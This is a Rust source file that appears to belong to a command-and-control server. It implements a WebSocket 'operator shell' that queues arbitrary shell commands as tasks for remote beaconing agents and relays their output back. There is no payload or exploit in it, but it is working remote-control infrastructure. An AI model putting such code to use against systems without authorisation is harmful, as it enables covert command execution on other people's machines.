use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use axum::extract::ws::{Message, WebSocket};
use futures_util::stream::SplitSink;
use futures_util::{SinkExt, StreamExt};
use tokio::sync::{mpsc, Mutex};
use tracing::{info, warn};

use crate::AppState;

#[derive(Clone, Debug, serde::Serialize)]
pub struct SessionInfo {
    pub session_id: String,
    pub agent_id: String,
    pub created_at: i64,
    pub last_activity: i64,
    pub alive: bool,
}

/// Shared registry of live operator WebSocket senders, keyed by session id.
///
/// This lives on `AppState` so any handler (beacon ingest, collect, admin)
/// can stream text back to the operator session that is watching a given
/// agent. A per-connection map (the previous design) could only echo the
/// operator's own input back to itself.
pub type RelayMap = Arc<Mutex<HashMap<String, mpsc::Sender<String>>>>;

/// Send a line of agent output to the operator session, if one is attached.
pub async fn relay_to_session(state: &AppState, session_id: &str, line: String) {
    let map = state.relay.lock().await;
    if let Some(tx) = map.get(session_id) {
        let _ = tx.send(line).await;
    }
}

/// Operator interactive shell over WebSocket.
///
/// Protocol:
/// 1. Operator connects to `GET /shell/:session_id` (WebSocket upgrade).
/// 2. First text frame must be a JSON object: `{"agent_id": "..."}`.
/// 3. Every following text frame is a shell command for that agent. The
///    server queues it as a task (`GET /task/:agent_id` is the pickup
///    point) and acknowledges the queueing over the same WebSocket.
/// 4. When an agent posts results (beacon frame with `session` + `output`
///    fields), they are streamed to the attached operator session.
pub async fn handle_shell(ws: WebSocket, state: AppState, session_id: String) {
    let (ws_sender, mut ws_receiver) = ws.split();

    // ── Handshake: operator tells us which agent it wants a shell on ──
    let agent_id = match ws_receiver.next().await {
        Some(Ok(Message::Text(text))) => {
            let ident: serde_json::Value = serde_json::from_str(&text).unwrap_or_default();
            let agent = ident
                .get("agent_id")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown")
                .to_string();
            info!(agent = %agent, session = %session_id, "Operator shell attached");
            agent
        }
        _ => {
            warn!(session = %session_id, "Session closed without identification");
            return;
        }
    };

    {
        let mut sessions = state.sessions.lock().await;
        sessions.register(&session_id, &agent_id);
    }

    // out_tx: anything sent here is streamed to the operator's WebSocket.
    let (out_tx, mut out_rx) = mpsc::channel::<String>(256);
    state.relay.lock().await.insert(session_id.clone(), out_tx);

    // ── Outbound: relayed agent output + pings → operator ──
    let ws_send_task = tokio::spawn(async move {
        let mut ws_sender: SplitSink<WebSocket, Message> = ws_sender;
        loop {
            tokio::select! {
                Some(msg) = out_rx.recv() => {
                    if ws_sender.send(Message::Text(msg)).await.is_err() {
                        break;
                    }
                }
                _ = tokio::time::sleep(Duration::from_secs(30)) => {
                    if ws_sender.send(Message::Ping(vec![])).await.is_err() {
                        break;
                    }
                }
            }
        }
    });

    // ── Inbound: operator commands → queued as real tasks for the agent ──
    let relay_map = state.relay.clone();
    let db = state.db.clone();
    let agent_for_tasks = agent_id.clone();
    let session_for_tasks = session_id.clone();
    let ws_recv_task = tokio::spawn(async move {
        let mut seq: u64 = 0;
        loop {
            match ws_receiver.next().await {
                Some(Ok(Message::Text(text))) => {
                    seq += 1;
                    let task_id = format!("sh-{}-{}", session_for_tasks, seq);
                    let payload = serde_json::json!({
                        "cmd": text,
                        "session": session_for_tasks,
                    });
                    {
                        let db = db.lock().await;
                        db.push_task(&agent_for_tasks, &task_id, "shell_exec", &payload);
                    }
                    // Acknowledge over the same socket (out map send).
                    if let Some(tx) = relay_map.lock().await.get(&session_for_tasks) {
                        let _ = tx.send(format!("[queued {task_id}] {text}")).await;
                    }
                    info!(agent = %agent_for_tasks, task = %task_id, "Shell command queued");
                }
                Some(Ok(Message::Close(_))) | None => break,
                _ => {}
            }
        }
    });

    tokio::select! {
        _ = ws_send_task => {},
        _ = ws_recv_task => {},
    }

    state.relay.lock().await.remove(&session_id);
    {
        let mut sessions = state.sessions.lock().await;
        sessions.unregister(&session_id);
    }

    info!(session = %session_id, "Shell session closed");
}
